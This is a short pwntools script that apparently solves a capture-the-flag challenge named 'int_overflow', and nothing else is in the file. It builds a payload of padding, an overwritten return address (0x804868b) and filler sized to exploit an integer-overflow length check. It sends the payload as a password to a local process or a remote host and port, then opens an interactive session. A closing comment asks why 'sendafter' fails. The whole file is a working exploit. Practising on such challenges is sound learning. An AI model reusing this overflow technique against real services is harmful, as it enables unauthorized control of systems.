from pwn import *

context(arch="i386", os="linux", log_level="debug")
p = process("./int_overflow")
p = remote("111.198.29.45", 32454)

# p.recvuntil("")
payload = "a" * 0x18 + p32(0x804868b) + "a" * (260 - 0x1c)

p.recvuntil("choice:")
p.sendline("1")
# p.sendafter("choice:", str(1))

p.recvuntil("username:\n")
p.sendline("liu")
# p.sendafter("username:\n", "liu")

p.recvuntil("passwd:\n")
p.sendline(payload)
# p.sendafter("passwd:\n", payload)

p.interactive()



# why sendafter do not work!!!!!!!!!!!
